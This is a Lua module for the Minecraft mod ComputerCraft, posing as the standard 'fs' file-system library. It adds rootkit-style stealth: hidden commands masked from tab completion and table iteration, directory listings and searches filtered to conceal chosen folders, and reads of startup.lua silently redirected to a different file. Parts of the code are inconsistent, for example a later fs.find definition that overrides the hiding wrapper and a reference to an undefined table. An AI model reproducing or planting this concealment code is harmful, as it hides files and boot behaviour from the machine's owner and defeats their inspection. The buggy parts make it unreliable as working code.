--- @module fs

local expect = dofile("rom/modules/main/cc/expect.lua")
local expect, field = expect.expect, expect.field

local native = _G.fs
local fs = native
for k, v in pairs(native) do fs[k] = v end

local hiddenDirs = {}
local originalStartup = "startup1.lua"

-- Helper function to check if a path is hidden
local function isHidden(path)
    for _, dir in ipairs(hiddenDirs) do
        -- Check if the path is the directory itself or inside a hidden directory
        if fs.combine("", path) == dir or string.sub(fs.combine("", path), 1, #dir + 1) == dir .. "/" then
            return true
        end
    end
    return false
end

-- Define the hidden commands and their implementations
local hiddenCommands = {}

-- Function to hide a directory
hiddenCommands.hideDir = function(path)
    if not fs.isDir(path) then
        error("Cannot hide: " .. path .. " is not a directory.", 2)
    end
    local normalizedPath = fs.combine("", path)
    for _, dir in ipairs(hiddenDirs) do
        if dir == normalizedPath then
            return -- Already hidden
        end
    end
    table.insert(hiddenDirs, normalizedPath)
end

-- Function to unhide a directory
hiddenCommands.unhideDir = function(path)
    local normalizedPath = fs.combine("", path)
    for i, dir in ipairs(hiddenDirs) do
        if dir == normalizedPath then
            table.remove(hiddenDirs, i)
            return
        end
    end
    error("Cannot unhide: " .. path .. " is not currently hidden.", 2)
end

-- Function to set the original startup file
hiddenCommands.setOriginalStartup = function(path)
    local normalizedPath = fs.combine("", path)
    if not fs.exists(normalizedPath) then
        error("Cannot set startup file: " .. path .. " does not exist.", 2)
    end
    if fs.isDir(normalizedPath) then
        error("Cannot set startup file: " .. path .. " is a directory.", 2)
    end
    originalStartup = normalizedPath
end

-- Attach hidden commands to the `fs` table
for name, func in pairs(hiddenCommands) do
    rawset(fs, name, func)
end

local hiddenCommands = {
    hideDir = true,
    unhideDir = true,
    setOriginalStartup = true,
}

if shell and shell.complete then
    local oldComplete = shell.complete
    shell.complete = function(line)
        local suggestions = oldComplete(line)
        if suggestions then
            local filtered = {}
            for _, suggestion in ipairs(suggestions) do
                local commandName = suggestion:match("fs%.(%w+)")
                if not hiddenCommands[commandName] then
                    table.insert(filtered, suggestion)
                end
            end
            return filtered
        end
        return suggestions
    end
end

setmetatable(fs, {
    __index = function(_, key)
        if hiddenCommands[key] then
            return nil -- Hide from tab completion
        end
        return native[key]
    end,
    __pairs = function()
        -- Only expose non-hidden commands
        return function(_, k)
            local nextKey, nextValue = next(native, k)
            while nextKey and hiddenCommands[nextKey] do
                nextKey, nextValue = next(native, nextKey)
            end
            return nextKey, nextValue
        end
    end,
})


-- Wrapper for fs.list to exclude hidden directories
local oldList = native.list
function fs.list(path)
    local files = oldList(path)
    local visibleFiles = {}
    for _, file in ipairs(files) do
        local fullPath = fs.combine(path, file)
        if not isHidden(fullPath) then
            table.insert(visibleFiles, file)
        end
    end
    return visibleFiles
end

-- Wrapper for fs.exists to account for hidden directories
local oldExists = native.exists
function fs.exists(path)
    if isHidden(path) then
        return true
    end
    return oldExists(path)
end

-- Wrapper for fs.isDir to account for hidden directories
local oldIsDir = native.isDir
function fs.isDir(path)
    if isHidden(path) then
        return true
    end
    return oldIsDir(path)
end

-- Redirect startup.lua checks to another file
local oldOpen = native.open
function fs.open(path, mode)
    if fs.combine("", path) == fs.combine("", "startup.lua") then
        return oldOpen(originalStartup, mode)
    end
    return oldOpen(path, mode)
end

-- Wrapper for fs.find to exclude hidden directories
local oldFind = native.find
function fs.find(pattern)
    local results = oldFind(pattern)
    local visibleResults = {}
    for _, path in ipairs(results) do
        if not isHidden(path) then
            table.insert(visibleResults, path)
        end
    end
    return visibleResults
end

--[[ Attach stealth methods (still callable directly)
for name, func in pairs(stealthMethods) do
    rawset(fs, name, func)
end
]]
--[[- Provides completion for a file or directory name, suitable for use with
@{_G.read}.
...
]]
function fs.complete(sPath, sLocation, bIncludeFiles, bIncludeDirs)
    expect(1, sPath, "string")
    expect(2, sLocation, "string")
    local bIncludeHidden = nil
    if type(bIncludeFiles) == "table" then
        bIncludeDirs = field(bIncludeFiles, "include_dirs", "boolean", "nil")
        bIncludeHidden = field(bIncludeFiles, "include_hidden", "boolean", "nil")
        bIncludeFiles = field(bIncludeFiles, "include_files", "boolean", "nil")
    else
        expect(3, bIncludeFiles, "boolean", "nil")
        expect(4, bIncludeDirs, "boolean", "nil")
    end

    bIncludeHidden = bIncludeHidden ~= false
    bIncludeFiles = bIncludeFiles ~= false
    bIncludeDirs = bIncludeDirs ~= false
    local sDir = sLocation
    local nStart = 1
    local nSlash = string.find(sPath, "[/\\]", nStart)
    if nSlash == 1 then
        sDir = ""
        nStart = 2
    end
    local sName
    while not sName do
        local nSlash = string.find(sPath, "[/\\]", nStart)
        if nSlash then
            local sPart = string.sub(sPath, nStart, nSlash - 1)
            sDir = fs.combine(sDir, sPart)
            nStart = nSlash + 1
        else
            sName = string.sub(sPath, nStart)
        end
    end

    if fs.isDir(sDir) then
        local tResults = {}
        if bIncludeDirs and sPath == "" then
            table.insert(tResults, ".")
        end
        if sDir ~= "" then
            if sPath == "" then
                table.insert(tResults, bIncludeDirs and ".." or "../")
            elseif sPath == "." then
                table.insert(tResults, bIncludeDirs and "." or "./")
            end
        end
        local tFiles = fs.list(sDir)
        for n = 1, #tFiles do
            local sFile = tFiles[n]
            if #sFile >= #sName and string.sub(sFile, 1, #sName) == sName and (
                bIncludeHidden or sFile:sub(1, 1) ~= "." or sName:sub(1, 1) == "."
            ) then
                local bIsDir = fs.isDir(fs.combine(sDir, sFile))
                local sResult = string.sub(sFile, #sName + 1)
                if bIsDir then
                    table.insert(tResults, sResult .. "/")
                    if bIncludeDirs and #sResult > 0 then
                        table.insert(tResults, sResult)
                    end
                else
                    if bIncludeFiles and #sResult > 0 then
                        table.insert(tResults, sResult)
                    end
                end
            end
        end
        return tResults
    end

    return {}
end

local function find_aux(path, parts, i, out)
    local part = parts[i]
    if not part then
        if fs.exists(path) then out[#out + 1] = path end
    elseif part.exact then
        return find_aux(fs.combine(path, part.contents), parts, i + 1, out)
    else
        if not fs.isDir(path) then return end

        local files = fs.list(path)
        for j = 1, #files do
            local file = files[j]
            if file:find(part.contents) then find_aux(fs.combine(path, file), parts, i + 1, out) end
        end
    end
end

local find_escape = {
    ["^"] = "%^", ["$"] = "%$", ["("] = "%(", [")"] = "%)", ["%"] = "%%",
    ["."] = "%.", ["["] = "%[", ["]"] = "%]", ["+"] = "%+", ["-"] = "%-",
    ["*"] = ".*",
    ["?"] = ".",
}

function fs.find(pattern)
    expect(1, pattern, "string")

    pattern = fs.combine(pattern)

    if pattern == ".." or pattern:sub(1, 3) == "../" then
        error("/" .. pattern .. ": Invalid Path", 2)
    end

    if not pattern:find("[*?]") then
        if fs.exists(pattern) then return { pattern } else return {} end
    end

    local parts = {}
    for part in pattern:gmatch("[^/]+") do
        if part:find("[*?]") then
            parts[#parts + 1] = {
                exact = false,
                contents = "^" .. part:gsub(".", find_escape) .. "$",
            }
        else
            parts[#parts + 1] = { exact = true, contents = part }
        end
    end

    local out = {}
    find_aux("", parts, 1, out)
    return out
end

function fs.isDriveRoot(sPath)
    expect(1, sPath, "string")
    return fs.getDir(sPath) == ".." or fs.getDrive(sPath) ~= fs.getDrive(fs.getDir(sPath))
end

return fs
